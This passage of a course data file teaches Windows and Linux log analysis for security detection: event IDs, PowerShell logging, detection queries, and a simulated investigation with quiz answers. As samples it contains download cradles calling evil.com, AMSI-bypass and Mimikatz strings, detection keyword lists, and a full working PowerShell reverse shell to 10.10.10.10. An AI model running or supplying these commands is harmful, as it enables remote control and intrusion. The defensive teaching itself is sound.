- Splunk Universal Forwarder
- Microsoft MMA/AMA
- Sysmon + WEF

### Agentless Collection

Logs pulled from systems or sent via syslog.

**Syslog (UDP/TCP/TLS):**
\`\`\`
[Device] ──UDP/514──→ [Syslog Server] ──→ [SIEM]
\`\`\`

**Windows Event Forwarding (WEF):**
\`\`\`
[Windows Clients] ──WinRM──→ [Collector] ──→ [SIEM]
\`\`\`

**API Polling:**
\`\`\`
[Cloud Service] ←──API──→ [SIEM] (pulls logs)
\`\`\`

### Protocol Comparison

| Method | Reliability | Security | Use Case |
|--------|-------------|----------|----------|
| Syslog UDP | Low (no ack) | Low | Legacy devices |
| Syslog TCP | Medium | Low | Network devices |
| Syslog TLS | Medium | High | Secure forwarding |
| HTTPS/API | High | High | Cloud, modern apps |
| Agent | High | High | Endpoints |

## Log Pipeline Architecture

A typical enterprise log pipeline:

\`\`\`
┌──────────────┐
│ Log Sources  │
└──────┬───────┘
       ↓
┌──────────────┐
│  Collectors  │  (rsyslog, Logstash, Fluentd)
└──────┬───────┘
       ↓
┌──────────────┐
│   Parsing    │  (Extract fields, normalize)
│   & Enrich   │
└──────┬───────┘
       ↓
┌──────────────┐
│    SIEM      │  (Index, correlate, alert)
└──────┬───────┘
       ↓
┌──────────────┐
│   Storage    │  (Hot/Warm/Cold tiers)
└──────────────┘
\`\`\`

## Key Considerations

### Timestamp Handling
- Ensure all sources use NTP
- Normalize to UTC
- Handle timezone conversions
- Log ingestion time vs event time

### Data Normalization
Map vendor-specific fields to common schema:
\`\`\`
Vendor A: src_addr → Common: source_ip
Vendor B: srcip → Common: source_ip
Vendor C: SourceIP → Common: source_ip
\`\`\`

### Log Retention
| Log Type | Typical Retention |
|----------|------------------|
| Security events | 1-2 years |
| Network traffic | 90 days - 1 year |
| Debug/verbose | 7-30 days |
| Compliance (PCI) | 1 year minimum |

### Volume Planning
Estimate daily log volume:
- Windows DC: 500MB - 2GB/day
- Firewall: 1-10GB/day
- Web proxy: 2-20GB/day
- EDR: 1-5GB/endpoint/day

## Common Collection Tools

| Tool | Type | Use Case |
|------|------|----------|
| rsyslog | Open source | Linux syslog collection |
| Logstash | Open source | ETL pipeline |
| Fluentd | Open source | Lightweight collection |
| NXLog | Commercial/Free | Cross-platform |
| Cribl | Commercial | Log routing/reduction |
    `,
    keyTakeaways: [
      "Centralized logging enables correlation and protects logs from tampering",
      "Agent-based collection provides rich data; agentless is simpler to deploy",
      "Syslog, WEF, and APIs are common collection methods",
      "Timestamp normalization and field mapping are critical",
      "Plan for log volume and retention requirements"
    ]
  },
  // Module 2: Windows Event Logs
  {
    id: "2.1",
    courseId: "log-analysis",
    title: "Windows Event Log Architecture",
    content: `
# Windows Event Log Architecture

Understanding how Windows logging works is essential for security analysis. Windows Event Logs are one of the richest sources of security telemetry.

## Event Log Structure

Windows stores logs in **.evtx** files using an XML-based structure.

### Log Locations
\`\`\`
%SystemRoot%\\System32\\winevt\\Logs\\
├── Security.evtx
├── System.evtx
├── Application.evtx
├── Microsoft-Windows-Sysmon%4Operational.evtx
├── Microsoft-Windows-PowerShell%4Operational.evtx
└── ... (hundreds more)
\`\`\`

## Main Event Log Channels

| Channel | Purpose | Key Events |
|---------|---------|------------|
| **Security** | Audit events | Logons, privilege use, object access |
| **System** | OS events | Service changes, drivers, errors |
| **Application** | App events | Crashes, app-specific logs |
| **PowerShell/Operational** | PS activity | Script execution |
| **Sysmon/Operational** | Sysmon events | Process, network, file |

## Event Log Components

Each event contains:

\`\`\`xml
<Event>
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing"/>
    <EventID>4624</EventID>
    <Version>2</Version>
    <Level>0</Level>
    <Task>12544</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8020000000000000</Keywords>
    <TimeCreated SystemTime="2023-10-11T22:14:15.003Z"/>
    <EventRecordID>123456</EventRecordID>
    <Computer>WORKSTATION01.domain.local</Computer>
  </System>
  <EventData>
    <Data Name="TargetUserName">john.doe</Data>
    <Data Name="LogonType">10</Data>
    ...
  </EventData>
</Event>
\`\`\`

### Key Fields

| Field | Description |
|-------|-------------|
| EventID | Unique event identifier |
| TimeCreated | When the event occurred |
| Computer | Hostname where event was logged |
| Provider | Source of the event |
| EventData | Event-specific details |

## Event Viewer Tool

The built-in **Event Viewer** (eventvwr.msc) allows you to:
- Browse and filter logs
- Create custom views
- Export logs
- Clear logs (requires admin)

### Useful Filters
\`\`\`
# Filter by Event ID
Event ID = 4624

# Filter by time
TimeCreated >= [Date]

# Filter by user (XPath)
*[EventData[Data[@Name='TargetUserName']='john.doe']]
\`\`\`

## Audit Policy Configuration

Windows must be configured to generate security events:

\`\`\`
Local Security Policy → Advanced Audit Policy Configuration:

├── Logon/Logoff
│   ├── Audit Logon: Success, Failure
│   └── Audit Logoff: Success
├── Account Management
│   └── Audit User Account Management: Success, Failure
├── Privilege Use
│   └── Audit Sensitive Privilege Use: Success, Failure
└── Object Access
    └── Audit File System: Success, Failure
\`\`\`

## Windows Event Forwarding (WEF)

Centralize Windows logs without third-party agents:

\`\`\`
[Workstation 1] ──┐
[Workstation 2] ──┼──WinRM──→ [Collector Server] ──→ [SIEM]
[Server 1] ───────┘
\`\`\`

### WEF Architecture
1. **Source computers** push events
2. **Collector** receives and stores
3. **Subscriptions** define what to collect

## PowerShell Commands for Logs

\`\`\`powershell
# List all event logs
Get-WinEvent -ListLog *

# Get recent Security events
Get-WinEvent -LogName Security -MaxEvents 100

# Filter by Event ID
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624}

# Export to CSV
Get-WinEvent -LogName Security | Export-Csv events.csv
\`\`\`

## Log Size and Retention

Default maximum log sizes are often too small:

| Log | Default Size | Recommended |
|-----|--------------|-------------|
| Security | 20 MB | 1-4 GB |
| System | 20 MB | 128 MB |
| Application | 20 MB | 128 MB |
| PowerShell | 15 MB | 1 GB |

Configure via: **Event Viewer → Log Properties → Maximum log size**
    `,
    keyTakeaways: [
      "Windows logs are stored in .evtx files with XML structure",
      "Security, System, Application, and PowerShell are key channels",
      "Audit policies must be configured to generate security events",
      "Event Viewer and PowerShell are primary tools for log access",
      "Default log sizes are too small—increase for security monitoring"
    ]
  },
  {
    id: "2.2",
    courseId: "log-analysis",
    title: "Critical Security Event IDs",
    content: `
# Critical Security Event IDs

Memorizing key Windows Event IDs is essential for rapid threat detection. These are the events you'll encounter most frequently.

## Authentication Events

### Logon Events

| Event ID | Description | Security Relevance |
|----------|-------------|-------------------|
| **4624** | Successful logon | Track who logged in |
| **4625** | Failed logon | Brute force detection |
| **4634** | Logoff | Session tracking |
| **4647** | User-initiated logoff | Normal logout |
| **4648** | Explicit credential use | RunAs, credential theft |
| **4672** | Special privileges assigned | Admin activity |

### Logon Types (Event 4624)

| Type | Name | Description |
|------|------|-------------|
| 2 | Interactive | Console logon |
| 3 | Network | SMB, mapped drives |
| 4 | Batch | Scheduled tasks |
| 5 | Service | Service startup |
| 7 | Unlock | Workstation unlock |
| 8 | NetworkCleartext | IIS basic auth |
| 9 | NewCredentials | RunAs /netonly |
| 10 | RemoteInteractive | RDP |
| 11 | CachedInteractive | Cached credentials |

**High-Risk Logon Types:** 3 (lateral movement), 10 (RDP access)

### Kerberos Events

| Event ID | Description | Detection Use |
|----------|-------------|---------------|
| **4768** | TGT requested | Initial authentication |
| **4769** | Service ticket requested | Service access |
| **4771** | Kerberos pre-auth failed | Password attacks |
| **4776** | Credential validation (NTLM) | NTLM usage |

## Account Management

| Event ID | Description | Security Relevance |
|----------|-------------|-------------------|
| **4720** | User account created | New account monitoring |
| **4722** | User account enabled | Account activation |
| **4723** | Password change attempted | User-initiated |
| **4724** | Password reset attempted | Admin reset |
| **4725** | User account disabled | Access removal |
| **4726** | User account deleted | Account cleanup |
| **4728** | User added to security group | Privilege escalation |
| **4732** | User added to local group | Local admin additions |
| **4756** | User added to universal group | Domain group changes |

## Process & Command Execution

| Event ID | Description | Security Relevance |
|----------|-------------|-------------------|
| **4688** | Process created | Command execution |
| **4689** | Process exited | Process termination |
| **1** (Sysmon) | Process created | Enhanced process logging |
| **400/403** (PS) | PowerShell engine start/stop | Script execution |
| **4104** (PS) | Script block logging | Full script content |

### Event 4688 - Process Creation
Enable command-line logging via GPO:
\`\`\`
Computer Configuration → Administrative Templates → 
System → Audit Process Creation → 
Include command line in process creation events = Enabled
\`\`\`

## Privilege Escalation

| Event ID | Description | Detection Use |
|----------|-------------|---------------|
| **4672** | Special privileges assigned | Admin logon detection |
| **4673** | Privileged service called | Sensitive operations |
| **4674** | Operation on privileged object | Critical access |

## Object Access

| Event ID | Description | Security Relevance |
|----------|-------------|-------------------|
| **4663** | Object access attempted | File/folder access |
| **4656** | Handle requested | Access attempt |
| **4660** | Object deleted | Deletion tracking |
| **5140** | Network share accessed | SMB access |
| **5145** | Network share object checked | Share enumeration |

## Scheduled Tasks

| Event ID | Description | Detection Use |
|----------|-------------|---------------|
| **4698** | Scheduled task created | Persistence detection |
| **4699** | Scheduled task deleted | Cleanup activity |
| **4700** | Scheduled task enabled | Task activation |
| **4702** | Scheduled task updated | Configuration changes |

## Quick Reference Card

\`\`\`
AUTHENTICATION:
  4624 → Successful logon
  4625 → Failed logon
  4648 → Explicit credentials (RunAs)
  4672 → Admin/special privileges

ACCOUNT CHANGES:
  4720 → User created
  4732 → Added to local group
  4728 → Added to domain group
  4724 → Password reset

EXECUTION:
  4688 → Process created
  4104 → PowerShell script block

LATERAL MOVEMENT:
  4624 (Type 3) → Network logon
  4624 (Type 10) → RDP logon
  5140 → Share access

PERSISTENCE:
  4698 → Scheduled task created
  7045 → Service installed
\`\`\`

## Investigation Tip

Always correlate events! A single 4624 tells you someone logged in. Combine with:
- 4688 events → What did they run?
- 5140 events → What shares did they access?
- 4648 events → Did they use other credentials?
    `,
    keyTakeaways: [
      "4624/4625 are essential for authentication monitoring",
      "Logon Type 3 (network) and 10 (RDP) often indicate lateral movement",
      "4688 with command-line logging reveals process execution",
      "4720/4732 help detect unauthorized account creation and privilege escalation",
      "Always correlate multiple event types for complete visibility"
    ],
    practicalExercise: {
      title: "Event ID Flash Cards",
      description: "Create flash cards to memorize the top 15 critical Event IDs.",
      steps: [
        "Write Event ID on one side, description on the other",
        "Practice identifying events by ID",
        "Test yourself on logon types",
        "Quiz a colleague on the events"
      ]
    }
  },
  {
    id: "2.3",
    courseId: "log-analysis",
    title: "Authentication & Logon Analysis",
    content: `
# Authentication & Logon Analysis

Analyzing authentication logs is fundamental to security monitoring. Most attacks involve compromised credentials at some point.

## The Authentication Flow

\`\`\`
User → Credentials → Authentication Protocol → Success/Failure → Access
         ↓                    ↓                      ↓
    Password/Cert     NTLM/Kerberos/LDAP       4624/4625
\`\`\`

## Analyzing Event 4624 (Successful Logon)

Key fields to examine:

\`\`\`
Subject:
  Security ID: SYSTEM
  Account Name: WORKSTATION01$
  
Logon Information:
  Logon Type: 10          ← How they logged in
  Logon GUID: {GUID}
  
New Logon:
  Security ID: DOMAIN\\john.doe
  Account Name: john.doe   ← Who logged in
  Account Domain: DOMAIN
  Logon ID: 0x12345       ← Session identifier
  
Network Information:
  Workstation Name: ATTACKER-PC
  Source Network Address: 192.168.1.100  ← Where from
  Source Port: 54321
  
Logon Process: NtLmSsp    ← Authentication protocol
Authentication Package: NTLM
\`\`\`

## Suspicious Logon Patterns

### 1. Failed Logon Storms (Brute Force)
\`\`\`
Time           EventID  User       SourceIP
10:00:01.001   4625     admin      192.168.1.50
10:00:01.050   4625     admin      192.168.1.50
10:00:01.102   4625     admin      192.168.1.50
10:00:01.155   4625     admin      192.168.1.50
10:00:01.203   4624     admin      192.168.1.50  ← Success!
\`\`\`

**Detection:** Multiple 4625 events followed by 4624 from same source.

### 2. Password Spraying
\`\`\`
Time           EventID  User       SourceIP       Status
10:00:01       4625     user1      192.168.1.50   Failed
10:00:02       4625     user2      192.168.1.50   Failed
10:00:03       4625     user3      192.168.1.50   Failed
10:00:04       4624     user4      192.168.1.50   Success!
\`\`\`

**Detection:** Same source, same password attempt against many accounts.

### 3. Lateral Movement
\`\`\`
Source: Workstation01 → Target: Server01
LogonType: 3 (Network)
Account: Domain Admin
Process: cmd.exe → psexec.exe
\`\`\`

**Detection:** Type 3 logons to servers from workstations, especially with admin accounts.

### 4. Impossible Travel
\`\`\`
10:00:00  User john.doe logged in from New York (192.168.1.50)
10:05:00  User john.doe logged in from Singapore (203.0.113.25)
\`\`\`

**Detection:** Logins from geographically impossible locations within short time.

### 5. Off-Hours Activity
\`\`\`
03:00:00 AM  User finance_user logged in (Type 10 - RDP)
             Normal hours: 8 AM - 6 PM
\`\`\`

**Detection:** Logons outside normal business hours for the user.

## NTLM vs Kerberos

### NTLM (Legacy)
- Events: 4776 (credential validation)
- Risks: Pass-the-Hash, relay attacks
- Detection: Monitor for unexpected NTLM usage

### Kerberos (Modern)
- Events: 4768 (TGT), 4769 (Service Ticket)
- Risks: Pass-the-Ticket, Kerberoasting
- Detection: Unusual service ticket requests

## Building Detection Queries

### SIEM Query: Brute Force Detection
\`\`\`sql
EventID=4625 
| stats count by TargetUserName, IpAddress, span=5m 
| where count > 10
\`\`\`

### SIEM Query: Admin Logon Monitoring
\`\`\`sql
EventID=4624 LogonType IN (3,10) 
| lookup admin_users TargetUserName 
| where is_admin=true
\`\`\`

### SIEM Query: RDP Brute Force
\`\`\`sql
EventID=4625 LogonType=10 
| stats count by IpAddress span=1h 
| where count > 50
\`\`\`

## Analysis Checklist

When investigating authentication events:

- [ ] Is this user/account expected to log in here?
- [ ] Is this logon type normal for this user?
- [ ] Is the source IP expected?
- [ ] Is the time of day normal?
- [ ] Are there preceding failed attempts?
- [ ] What happened after the logon? (4688 events)
- [ ] Is the authentication protocol appropriate? (NTLM vs Kerberos)
    `,
    keyTakeaways: [
      "4624 contains critical fields: LogonType, User, SourceIP, and Process",
      "Brute force shows as multiple 4625 followed by 4624",
      "Lateral movement typically uses Type 3 (network) logons",
      "Monitor for NTLM usage as it's more vulnerable than Kerberos",
      "Correlate authentication events with subsequent activity (4688)"
    ]
  },
  {
    id: "2.4",
    courseId: "log-analysis",
    title: "Process & Command Line Logging",
    content: `
# Process & Command Line Logging

Process execution logging is critical for detecting malicious activity. Attackers must run commands, and those commands leave traces.

## Event ID 4688: Process Creation

This is Windows' native process creation logging.

### Key Fields

\`\`\`
Subject:
  Account Name: john.doe      ← Who ran it
  
Process Information:
  New Process ID: 0x1234
  New Process Name: C:\\Windows\\System32\\cmd.exe  ← What ran
  Creator Process ID: 0x5678
  Creator Process Name: C:\\Windows\\explorer.exe   ← Parent process
  
Command Line: cmd.exe /c whoami  ← Full command (if enabled)
\`\`\`

### Enabling Command Line Logging

**Via Group Policy:**
\`\`\`
Computer Configuration → 
Administrative Templates → 
System → Audit Process Creation → 
Include command line in process creation events = Enabled
\`\`\`

**Via Registry:**
\`\`\`
HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit
ProcessCreationIncludeCmdLine_Enabled = 1
\`\`\`

## Sysmon: Enhanced Process Logging

Sysmon provides richer process data than native logging.

### Sysmon Event ID 1: Process Create

\`\`\`xml
<Event>
  <EventData>
    <Data Name="UtcTime">2023-10-11 22:14:15.003</Data>
    <Data Name="ProcessGuid">{guid}</Data>
    <Data Name="ProcessId">1234</Data>
    <Data Name="Image">C:\\Windows\\System32\\cmd.exe</Data>
    <Data Name="CommandLine">cmd.exe /c whoami</Data>
    <Data Name="User">DOMAIN\\john.doe</Data>
    <Data Name="ParentImage">C:\\Windows\\explorer.exe</Data>
    <Data Name="ParentCommandLine">explorer.exe</Data>
    <Data Name="Hashes">SHA256=abc123...</Data>
  </EventData>
</Event>
\`\`\`

### Sysmon Advantages
- File hashes (MD5, SHA1, SHA256)
- Parent command line
- Process GUID for tracking
- Network connections (Event 3)
- File creation (Event 11)

## Suspicious Process Patterns

### 1. Living Off the Land Binaries (LOLBins)
Attackers abuse built-in Windows tools:

| Binary | Suspicious Use |
|--------|----------------|
| powershell.exe | Encoded commands, download cradles |
| cmd.exe | Spawned from unusual parents |
| wscript.exe | Running remote scripts |
| mshta.exe | Running HTA files |
| certutil.exe | Downloading files |
| bitsadmin.exe | File transfers |
| regsvr32.exe | Loading remote DLLs |

**Detection Example:**
\`\`\`
Process: certutil.exe
CommandLine: certutil -urlcache -split -f http://evil.com/payload.exe
\`\`\`

### 2. Suspicious Parent-Child Relationships

**Normal:**
\`\`\`
explorer.exe → chrome.exe ✓
explorer.exe → notepad.exe ✓
services.exe → svchost.exe ✓
\`\`\`

**Suspicious:**
\`\`\`
outlook.exe → powershell.exe ⚠️ (Macro execution)
winword.exe → cmd.exe ⚠️ (Macro execution)
w3wp.exe → cmd.exe ⚠️ (Web shell)
svchost.exe → cmd.exe ⚠️ (Potentially malicious)
\`\`\`

### 3. Encoded PowerShell

**Red Flags:**
\`\`\`
powershell.exe -enc <base64>
powershell.exe -e <base64>
powershell.exe -EncodedCommand <base64>
powershell.exe -nop -w hidden -c IEX(...)
\`\`\`

**Decode Base64 to see actual command:**
\`\`\`bash
echo "SGVsbG8gV29ybGQ=" | base64 -d
\`\`\`

### 4. Download Cradles

Commands that download and execute:
\`\`\`powershell
# PowerShell
IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')
Invoke-Expression (Invoke-WebRequest 'http://evil.com/script.ps1')

# Certutil
certutil -urlcache -split -f http://evil.com/payload.exe C:\\temp\\payload.exe

# BITSAdmin
bitsadmin /transfer job http://evil.com/payload.exe C:\\temp\\payload.exe
\`\`\`

## Building Detection Rules

### Encoded PowerShell Detection
\`\`\`
Process = "powershell.exe" 
AND CommandLine matches regex "-(e|enc|encodedcommand)\\s+[A-Za-z0-9+/=]{50,}"
\`\`\`

### Unusual Parent-Child
\`\`\`
ParentImage IN (
  "*\\outlook.exe", 
  "*\\winword.exe", 
  "*\\excel.exe"
) 
AND Image IN (
  "*\\powershell.exe", 
  "*\\cmd.exe", 
  "*\\wscript.exe"
)
\`\`\`

### Certutil Download
\`\`\`
Process = "*\\certutil.exe"
AND CommandLine contains any of ("-urlcache", "-split", "http://", "https://")
\`\`\`
    `,
    keyTakeaways: [
      "Event 4688 with command-line logging captures process execution",
      "Sysmon provides richer data including hashes and parent command lines",
      "Watch for LOLBins (certutil, mshta, bitsadmin) used maliciously",
      "Unusual parent-child relationships indicate potential compromise",
      "Encoded PowerShell commands are a major red flag"
    ]
  },
  {
    id: "2.5",
    courseId: "log-analysis",
    title: "PowerShell Logging",
    content: `
# PowerShell Logging

PowerShell is both a powerful admin tool and a favorite of attackers. Proper logging is essential for detecting malicious use.

## Types of PowerShell Logging

### 1. Module Logging
Records pipeline execution details for specified modules.

**Enable via GPO:**
\`\`\`
Computer Configuration → Administrative Templates → 
Windows Components → Windows PowerShell → 
Turn on Module Logging = Enabled
Module Names = *  (all modules)
\`\`\`

**Event Log:** Microsoft-Windows-PowerShell/Operational
**Event ID:** 4103

### 2. Script Block Logging
Records the full content of executed scripts.

**Enable via GPO:**
\`\`\`
Computer Configuration → Administrative Templates → 
Windows Components → Windows PowerShell → 
Turn on PowerShell Script Block Logging = Enabled
Log script block invocation = Checked (optional)
\`\`\`

**Event Log:** Microsoft-Windows-PowerShell/Operational
**Event ID:** 4104

### 3. Transcription Logging
Creates text transcript of entire PowerShell session.

**Enable via GPO:**
\`\`\`
Computer Configuration → Administrative Templates → 
Windows Components → Windows PowerShell → 
Turn on PowerShell Transcription = Enabled
Transcript Output Directory = \\\\server\\share\\transcripts\\
\`\`\`

**Output:** Text files in specified directory

## Script Block Logging (Event 4104)

This is the most valuable for threat detection.

### Example Event

\`\`\`xml
<Event>
  <System>
    <EventID>4104</EventID>
    <TimeCreated SystemTime="2023-10-11T22:14:15Z"/>
  </System>
  <EventData>
    <Data Name="MessageNumber">1</Data>
    <Data Name="MessageTotal">1</Data>
    <Data Name="ScriptBlockText">
      $client = New-Object System.Net.WebClient
      $client.DownloadString("http://evil.com/payload.ps1") | IEX
    </Data>
    <Data Name="ScriptBlockId">{guid}</Data>
    <Data Name="Path">C:\\temp\\malware.ps1</Data>
  </EventData>
</Event>
\`\`\`

### Key Field: ScriptBlockText
This contains the **actual code** that was executed!

## Malicious PowerShell Patterns

### 1. Download and Execute
\`\`\`powershell
# Common patterns
IEX (New-Object Net.WebClient).DownloadString('http://...')
Invoke-Expression (Invoke-WebRequest '...')
IEX (iwr '...')
\`\`\`

### 2. Encoded Commands
\`\`\`powershell
# Base64 encoded
powershell -enc SGVsbG8gV29ybGQ=

# Decodes to actual command in Event 4104
\`\`\`

### 3. Obfuscation Techniques
\`\`\`powershell
# String concatenation
$a = "Net."; $b = "WebClient"; $c = New-Object ($a + $b)

# Character replacement
"IEX" -replace 'X','X'

# Tick marks (backticks)
I\`E\`X

# Variable substitution
$DoIt = 'IEX'; & $DoIt (...)
\`\`\`

### 4. AMSI Bypass Attempts
\`\`\`powershell
# Common bypass patterns to watch for
[Ref].Assembly.GetType('...')
Add-Type -TypeDefinition '...'
'AmsiContext', 'amsiSession'
\`\`\`

### 5. Credential Theft
\`\`\`powershell
# Mimikatz
Invoke-Mimikatz
sekurlsa::logonpasswords

# Credential dumping
[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR
Get-Credential
\`\`\`

## Detection Queries

### Download Cradles
\`\`\`
EventID=4104 
ScriptBlockText matches regex ".*(DownloadString|DownloadFile|WebClient|Invoke-WebRequest|iwr|wget|curl).*"
\`\`\`

### Encoded Commands
\`\`\`
EventID=4104 
ScriptBlockText matches regex "FromBase64String|ToBase64String|[Convert]::FromBase64"
\`\`\`

### AMSI Bypass Attempts
\`\`\`
EventID=4104 
ScriptBlockText matches regex "amsi|AmsiUtils|AmsiContext"
\`\`\`

### Suspicious Keywords
\`\`\`
EventID=4104 
ScriptBlockText contains any of (
  "mimikatz",
  "bloodhound",
  "powersploit",
  "empire",
  "invoke-psexec",
  "invoke-wmi",
  "sekurlsa"
)
\`\`\`

## Analysis Tips

1. **Large script blocks** may be split across multiple 4104 events (check MessageNumber/MessageTotal)

2. **Decode Base64** in ScriptBlockText to see true commands

3. **Correlate with 4688** to see who ran PowerShell

4. **Check ScriptBlockId** to group related events

5. **Path field** shows if script was file-based or console
    `,
    keyTakeaways: [
      "Enable Script Block Logging (4104) for full visibility into PowerShell",
      "Event 4104 shows decoded scripts even when encoded on command line",
      "Watch for download cradles, AMSI bypasses, and obfuscation",
      "Transcription logging creates full session records",
      "Correlate PowerShell events with process creation events"
    ]
  },
  {
    id: "2.6",
    courseId: "log-analysis",
    title: "Hands-On: Windows Log Investigation",
    content: `
# Hands-On: Windows Log Investigation

Put your Windows log analysis skills to the test! This practical exercise simulates a real investigation scenario.

## Scenario

A security alert triggered on a workstation (WORKSTATION01). Your task is to investigate the Windows Event Logs and determine:

1. Was the system compromised?
2. What actions did the attacker take?
3. What IOCs can you extract?

## Sample Log Events

### Event 1: Failed Logon Attempts
\`\`\`
Time: 2023-10-11 08:42:15
EventID: 4625
Account Name: administrator
Source IP: 192.168.1.100
Failure Reason: Bad password
Logon Type: 3
\`\`\`

\`\`\`
Time: 2023-10-11 08:42:16
EventID: 4625
Account Name: administrator  
Source IP: 192.168.1.100
Failure Reason: Bad password
Logon Type: 3
\`\`\`
*(50 more similar events over 2 minutes)*

### Event 2: Successful Logon
\`\`\`
Time: 2023-10-11 08:44:30
EventID: 4624
Account Name: administrator
Source IP: 192.168.1.100
Logon Type: 3
Logon Process: NtLmSsp
\`\`\`

### Event 3: Special Privileges Assigned
\`\`\`
Time: 2023-10-11 08:44:31
EventID: 4672
Account Name: administrator
Privileges: SeDebugPrivilege, SeBackupPrivilege, SeRestorePrivilege
\`\`\`

### Event 4: Process Creation
\`\`\`
Time: 2023-10-11 08:45:00
EventID: 4688
New Process: C:\\Windows\\System32\\cmd.exe
Creator Process: C:\\Windows\\System32\\services.exe
Command Line: cmd.exe /c whoami
Account: administrator
\`\`\`

### Event 5: PowerShell Execution
\`\`\`
Time: 2023-10-11 08:45:15
EventID: 4104
ScriptBlockText:
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}
\`\`\`

### Event 6: Scheduled Task Created
\`\`\`
Time: 2023-10-11 08:47:00
EventID: 4698
Task Name: \\Microsoft\\Windows\\UpdateCheck
Task Content: cmd.exe /c powershell -ep bypass -f C:\\Windows\\Temp\\update.ps1
Account: SYSTEM
\`\`\`

### Event 7: Network Share Access
\`\`\`
Time: 2023-10-11 08:50:00
EventID: 5140
Account: administrator
Share Name: \\\\*\\C$
Source IP: 192.168.1.100
Access Mask: 0x1
\`\`\`

## Investigation Questions

Answer these based on the logs above:

### Question 1: Initial Access
How did the attacker gain access?
- [ ] A) Phishing email
- [ ] B) Brute force attack
- [ ] C) Exploited vulnerability
- [ ] D) Valid credentials

### Question 2: Attack Type
The 50+ failed logons followed by success indicates:
- [ ] A) Normal user forgot password
- [ ] B) Password spraying
- [ ] C) Brute force attack
- [ ] D) Credential stuffing

### Question 3: Malicious Script
What does the PowerShell script in Event 5 do?
- [ ] A) Downloads a file
- [ ] B) Creates a reverse shell
- [ ] C) Encrypts files
- [ ] D) Adds a user

### Question 4: Persistence
How did the attacker establish persistence?
- [ ] A) Registry run key
- [ ] B) Scheduled task
- [ ] C) Service installation
- [ ] D) Startup folder

### Question 5: C2 Server
What is the attacker's command and control IP?

Answer: ________________

### Question 6: IOCs
List all IOCs from this investigation:

- IP Addresses:
- Hostnames:
- File Paths:
- Scheduled Tasks:

## Attack Timeline

\`\`\`
08:42:15 ─── Brute force begins (50+ attempts)
    │
08:44:30 ─── Successful authentication (Type 3)
    │
08:44:31 ─── Admin privileges obtained
    │
08:45:00 ─── Reconnaissance (whoami)
    │
08:45:15 ─── Reverse shell established
    │
08:47:00 ─── Persistence via scheduled task
    │
08:50:00 ─── Lateral movement (C$ share access)
\`\`\`

## Answers

1. **B** - Brute force attack (multiple failed then success)
2. **C** - Brute force (same account, sequential attempts)
3. **B** - Reverse shell (TCP connection, command execution)
4. **B** - Scheduled task (Event 4698)
5. **10.10.10.10** (from PowerShell script)
6. IOCs:
   - IPs: 192.168.1.100, 10.10.10.10
   - Path: C:\\Windows\\Temp\\update.ps1
   - Task: \\Microsoft\\Windows\\UpdateCheck
    `,
    keyTakeaways: [
      "Multiple 4625 events followed by 4624 indicates brute force success",
      "Event 4104 reveals malicious scripts even when obfuscated",
      "4698 events show persistence via scheduled tasks",
      "5140 events indicate lateral movement via shares",
      "Building a timeline is critical for understanding the full attack"
    ],
    practicalExercise: {
      title: "Create an Investigation Report",
      description: "Document this incident as if you were the responding analyst.",
      steps: [
        "Write an executive summary",
        "Create a detailed timeline",
        "List all IOCs discovered",
        "Document the attack chain",
        "Provide recommendations for remediation"
      ]
    }
  },
  // Module 3: Linux System Logs
  {
    id: "3.1",
    courseId: "log-analysis",
    title: "Linux Logging Architecture",
    content: `
# Linux Logging Architecture

Linux has a robust logging infrastructure that's essential for security monitoring. Understanding this architecture helps you know where to find evidence.

## Linux Logging Overview

\`\`\`
┌─────────────────────────────────────────────────────────────┐
│                    Linux Logging Stack                       │
├─────────────────────────────────────────────────────────────┤
│  Applications & Services                                     │
│     ↓                                                        │
│  syslog() / journald API                                    │
│     ↓                                                        │
│  rsyslog / syslog-ng / systemd-journald                     │
│     ↓                                                        │
│  /var/log/* or journalctl                                   │
└─────────────────────────────────────────────────────────────┘
\`\`\`

## Key Log Locations

### /var/log Directory Structure

| Log File | Purpose |
|----------|---------|
| /var/log/auth.log | Authentication events (Debian/Ubuntu) |
| /var/log/secure | Authentication events (RHEL/CentOS) |
| /var/log/syslog | General system messages (Debian/Ubuntu) |
| /var/log/messages | General system messages (RHEL/CentOS) |
| /var/log/kern.log | Kernel messages |
| /var/log/cron | Cron job execution |
| /var/log/maillog | Mail server logs |
| /var/log/apache2/ | Apache web server |
| /var/log/nginx/ | Nginx web server |
| /var/log/audit/ | Linux Audit (auditd) logs |

## Syslog Facilities and Priorities

### Facilities (Sources)
| Facility | Code | Description |
|----------|------|-------------|
| kern | 0 | Kernel messages |
| user | 1 | User-level messages |
| mail | 2 | Mail system |
| daemon | 3 | System daemons |
| auth | 4 | Security/auth |
| syslog | 5 | Syslog internal |
| local0-7 | 16-23 | Custom use |

### Priorities (Severity)
| Priority | Code | Description |
|----------|------|-------------|
| emerg | 0 | System unusable |
| alert | 1 | Immediate action needed |
| crit | 2 | Critical conditions |
| err | 3 | Error conditions |
| warning | 4 | Warning conditions |
| notice | 5 | Normal but significant |
| info | 6 | Informational |
| debug | 7 | Debug messages |

## systemd-journald

Modern Linux systems use **journald** alongside or instead of traditional syslog.

### journalctl Commands

\`\`\`bash
# View all logs
journalctl

# View logs since boot
journalctl -b

# View logs for specific service
journalctl -u sshd

# View logs since specific time
journalctl --since "2023-10-11 08:00:00"

# Follow logs in real-time
journalctl -f

# Show only errors and above
journalctl -p err

# View authentication logs
journalctl -t sshd

# Output as JSON
journalctl -o json-pretty
\`\`\`

## rsyslog Configuration

rsyslog is the most common syslog implementation.

### Configuration File: /etc/rsyslog.conf

\`\`\`
# Log auth messages to auth.log
auth,authpriv.*    /var/log/auth.log

# Log everything except auth to syslog
*.*;auth,authpriv.none    /var/log/syslog

# Log kernel messages to kern.log
